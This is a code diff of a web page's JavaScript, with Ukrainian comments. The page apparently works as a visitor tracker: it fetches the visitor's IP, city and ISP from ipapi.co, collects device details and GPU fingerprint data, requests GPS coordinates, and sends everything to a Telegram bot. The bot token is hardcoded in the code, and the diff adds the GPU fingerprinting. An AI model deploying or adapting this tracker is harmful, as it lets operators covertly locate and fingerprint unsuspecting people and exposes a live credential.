@@ -43,9 +43,9 @@
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 
 <script>
-// --- ТВОЇ ДАНІ (ПЕРЕВІРЕНО) ---
+// --- КОНФІГУРАЦІЯ (ОНОВЛЕНО ID) ---
 const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
-const TG_CHAT_ID = "-5268795829";
+const TG_CHAT_ID = "-1003787168523";
 
 // Оновлення часу
 setInterval(() => {
@@ -70,7 +70,7 @@ let scan = setInterval(() => {
     }
 }, 20);
 
-// Функція відправки
+// Функція відправки в Telegram
 async function sendToTelegram(d, type = "LOG") {
     const message = `
 🔔 *${type === 'GPS' ? '🎯 ТОЧНІ КООРДИНАТИ' : '🌐 НОВИЙ ВІЗИТ'}*
@@ -79,12 +79,11 @@ async function sendToTelegram(d, type = "LOG") {
 🏢 *ISP:* ${d.org || 'Невідомо'}
 📱 *OS:* ${navigator.platform}
 🖥️ *Screen:* ${screen.width}x${screen.height}
-🔋 *Cores:* ${navigator.hardwareConcurrency || '?'}
 🔗 *Maps:* https://www.google.com/maps?q=${d.latitude},${d.longitude}
     `;
 
     try {
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -93,23 +92,27 @@ async function sendToTelegram(d, type = "LOG") {
                 parse_mode: "Markdown"
             })
         });
-    } catch (e) { console.error("TG Fail:", e); }
+        const res = await response.json();
+        if (!res.ok) console.error("TG Error:", res.description);
+    } catch (e) { 
+        console.error("Fetch Fail:", e); 
+    }
 }
 
 function startLogic() {
     fetch("https://ipapi.co/json/")
         .then(r => r.json())
         .then(data => {
-            // 1. Шлемо в ТГ
+            // Відправляємо боту основні дані
             sendToTelegram(data, "IP");
 
-            // 2. Анімація для юзера
+            // Виведення даних на екран
             setTimeout(() => { document.getElementById("ip").innerText = data.ip; document.getElementById("ipBox").classList.add("show"); }, 300);
             setTimeout(() => { document.getElementById("location").innerText = `${data.city}, ${data.country_name}`; document.getElementById("countryBox").classList.add("show"); }, 600);
             setTimeout(() => { document.getElementById("isp").innerText = data.org; document.getElementById("ispBox").classList.add("show"); }, 900);
             setTimeout(() => { document.getElementById("device").innerText = navigator.userAgent; document.getElementById("deviceBox").classList.add("show"); }, 1200);
 
-            // EXTRA DATA (те, що ти просив)
+            // Блок EXTRA DATA
             setTimeout(() => {
                 const extra = document.createElement("div");
                 extra.className = "box show";
@@ -118,7 +121,7 @@ function startLogic() {
                     <div class="value">
                         Language: ${navigator.language}<br>
                         Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}<br>
-                        Cookies: ${navigator.cookieEnabled ? "Enabled" : "Disabled"}
+                        GPU: ${getGPU()}
                     </div>
                 `;
                 document.getElementById("extraContainer").appendChild(extra);
@@ -126,7 +129,7 @@ function startLogic() {
 
             setTimeout(() => { document.getElementById("timeBox").classList.add("show"); }, 1800);
 
-            // 3. Карта + GPS (з підтвердженням)
+            // Карта та спроба отримати GPS
             setTimeout(() => {
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
@@ -142,8 +145,16 @@ function startLogic() {
                     showMap(data.latitude, data.longitude, data.city);
                 }
             }, 2100);
-        })
-        .catch(() => { statusText.innerText = "API CONNECTION ERROR"; });
+        });
+}
+
+function getGPU() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    } catch (e) { return "N/A"; }
 }
 
 function showMap(lat, lon, label) {
